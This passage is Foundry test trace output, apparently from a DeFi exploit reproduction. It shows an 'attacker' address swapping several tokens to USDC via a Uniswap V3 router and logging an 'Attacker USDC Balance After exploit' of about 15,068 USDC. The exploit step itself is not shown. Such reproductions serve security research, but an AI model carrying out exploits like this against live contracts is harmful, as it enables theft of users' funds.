    │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 69669705859926416088 [6.966e19]
    │   └─ ← [Return] 69669705859926416088 [6.966e19]
    ├─ [25702] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 69669705859926416088 [6.966e19])
    │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   ├─ [24562] 0x3f770Ac673856F105b586bb393d122721265aD46::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 69669705859926416088 [6.966e19]) [delegatecall]
    │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 69669705859926416088 [6.966e19])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [106336] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 69669705859926416088 [6.966e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [98875] 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e::swap(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 69669705859926416088 [6.966e19], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bf97f4df75117a78c1a5a0dbb814af92458539fb4000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   ├─ [10163] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 974896474 [9.748e8])
    │   │   │   ├─ [9463] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 974896474 [9.748e8]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 974896474 [9.748e8])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3602] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::balanceOf(0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e) [staticcall]
    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   ├─ [2465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e) [delegatecall]
    │   │   │   │   └─ ← [Return] 6288389870288120312932 [6.288e21]
    │   │   │   └─ ← [Return] 6288389870288120312932 [6.288e21]
    │   │   ├─ [14157] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(-974896474 [-9.748e8], 69669705859926416088 [6.966e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bf97f4df75117a78c1a5a0dbb814af92458539fb4000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   │   ├─ [10071] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, 69669705859926416088 [6.966e19])
    │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   │   ├─ [8928] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, 69669705859926416088 [6.966e19]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, value: 69669705859926416088 [6.966e19])
    │   │   │   │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1602] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::balanceOf(0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e) [staticcall]
    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e) [delegatecall]
    │   │   │   │   └─ ← [Return] 6358059576148046729020 [6.358e21]
    │   │   │   └─ ← [Return] 6358059576148046729020 [6.358e21]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -974896474 [-9.748e8], param3: 69669705859926416088 [6.966e19], param4: 21192182047523104542240810839335228 [2.119e34], param5: 61929342155436885 [6.192e16], param6: 249948 [2.499e5])
    │   │   └─ ← [Return] -974896474 [-9.748e8], 69669705859926416088 [6.966e19]
    │   └─ ← [Return] 974896474 [9.748e8]
    ├─ [1077] 0x5979D7b546E38E414F7E9822514be443A4800529::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [530] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 266618989782460718 [2.666e17]
    │   └─ ← [Return] 266618989782460718 [2.666e17]
    ├─ [25155] 0x5979D7b546E38E414F7E9822514be443A4800529::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 266618989782460718 [2.666e17])
    │   ├─ [24605] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 266618989782460718 [2.666e17]) [delegatecall]
    │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 266618989782460718 [2.666e17])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [130500] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x5979D7b546E38E414F7E9822514be443A4800529, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 266618989782460718 [2.666e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [123068] 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8::swap(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 266618989782460718 [2.666e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5979d7b546e38e414f7e9822514be443a4800529000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   ├─ [10163] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1604543 [1.604e6])
    │   │   │   ├─ [9463] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1604543 [1.604e6]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1604543 [1.604e6])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3077] 0x5979D7b546E38E414F7E9822514be443A4800529::balanceOf(0x7092e723285fe1381a3a59C0d438f53d2c26D9E8) [staticcall]
    │   │   │   ├─ [2530] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::balanceOf(0x7092e723285fe1381a3a59C0d438f53d2c26D9E8) [delegatecall]
    │   │   │   │   └─ ← [Return] 441239489704298 [4.412e14]
    │   │   │   └─ ← [Return] 441239489704298 [4.412e14]
    │   │   ├─ [13171] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(266618989782460718 [2.666e17], -1604543 [-1.604e6], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5979d7b546e38e414f7e9822514be443a4800529000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   │   ├─ [9115] 0x5979D7b546E38E414F7E9822514be443A4800529::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, 266618989782460718 [2.666e17])
    │   │   │   │   ├─ [8559] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, 266618989782460718 [2.666e17]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, value: 266618989782460718 [2.666e17])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1077] 0x5979D7b546E38E414F7E9822514be443A4800529::balanceOf(0x7092e723285fe1381a3a59C0d438f53d2c26D9E8) [staticcall]
    │   │   │   ├─ [530] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::balanceOf(0x7092e723285fe1381a3a59C0d438f53d2c26D9E8) [delegatecall]
    │   │   │   │   └─ ← [Return] 267060229272165016 [2.67e17]
    │   │   │   └─ ← [Return] 267060229272165016 [2.67e17]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 266618989782460718 [2.666e17], param3: -1604543 [-1.604e6], param4: 7921097757947099344557 [7.921e21], param5: 26620229120 [2.662e10], param6: -322383 [-3.223e5])
    │   │   └─ ← [Return] 266618989782460718 [2.666e17], -1604543 [-1.604e6]
    │   └─ ← [Return] 1604543 [1.604e6]
    ├─ [1296] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 287173939050505854 [2.871e17]
    │   └─ ← [Return] 287173939050505854 [2.871e17]
    ├─ [25308] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 287173939050505854 [2.871e17])
    │   ├─ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 287173939050505854 [2.871e17]) [delegatecall]
    │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 287173939050505854 [2.871e17])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [76980] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 287173939050505854 [2.871e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [69548] 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c::swap(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 287173939050505854 [2.871e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b82af49447d8a07e3bd95bd0d56f35241523fbab1000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   ├─ [10163] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 872150727 [8.721e8])
    │   │   │   ├─ [9463] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 872150727 [8.721e8]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 872150727 [8.721e8])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3296] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::balanceOf(0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c) [staticcall]
    │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c) [delegatecall]
    │   │   │   │   └─ ← [Return] 347571490444047882460 [3.475e20]
    │   │   │   └─ ← [Return] 347571490444047882460 [3.475e20]
    │   │   ├─ [13752] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(287173939050505854 [2.871e17], -872150727 [-8.721e8], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b82af49447d8a07e3bd95bd0d56f35241523fbab1000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   │   ├─ [9680] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, 287173939050505854 [2.871e17])
    │   │   │   │   ├─ [8928] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, 287173939050505854 [2.871e17]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, value: 287173939050505854 [2.871e17])
    │   │   │   │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1296] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::balanceOf(0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c) [staticcall]
    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c) [delegatecall]
    │   │   │   │   └─ ← [Return] 347858664383098388314 [3.478e20]
    │   │   │   └─ ← [Return] 347858664383098388314 [3.478e20]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 287173939050505854 [2.871e17], param3: -872150727 [-8.721e8], param4: 4372452835577553805627592 [4.372e24], param5: 113877967787859301 [1.138e17], param6: -196106 [-1.961e5])
    │   │   └─ ← [Return] 287173939050505854 [2.871e17], -872150727 [-8.721e8]
    │   └─ ← [Return] 872150727 [8.721e8]
    ├─ [1296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 300000000 [3e8]
    │   └─ ← [Return] 300000000 [3e8]
    ├─ [27939] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 300000000 [3e8])
    │   ├─ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 300000000 [3e8]) [delegatecall]
    │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 300000000 [3e8])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [461654] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 300000000 [3e8], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [454193] 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d::swap(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 300000000 [3e8], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc8000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   ├─ [10163] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50848707 [5.084e7])
    │   │   │   ├─ [9463] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50848707 [5.084e7]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50848707 [5.084e7])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d) [staticcall]
    │   │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d) [delegatecall]
    │   │   │   │   └─ ← [Return] 101204834 [1.012e8]
    │   │   │   └─ ← [Return] 101204834 [1.012e8]
    │   │   ├─ [16549] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(-50848707 [-5.084e7], 300000000 [3e8], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc8000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   │   ├─ [12463] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, 300000000 [3e8])
    │   │   │   │   ├─ [11711] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, 300000000 [3e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, value: 300000000 [3e8])
    │   │   │   │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d) [staticcall]
    │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d) [delegatecall]
    │   │   │   │   └─ ← [Return] 401204834 [4.012e8]
    │   │   │   └─ ← [Return] 401204834 [4.012e8]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -50848707 [-5.084e7], param3: 300000000 [3e8], param4: 104644683394479565252079335441849 [1.046e32], param5: 186639 [1.866e5], param6: 143727 [1.437e5])
    │   │   └─ ← [Return] -50848707 [-5.084e7], 300000000 [3e8]
    │   └─ ← [Return] 50848707 [5.084e7]
    ├─ [1250] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 15068068008 [1.506e10]
    │   └─ ← [Return] 15068068008 [1.506e10]
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance After exploit", val: 15068068008 [1.506e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.40s (22.40s CPU time)

Ran 2 test suites in 23.41s (23.64s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
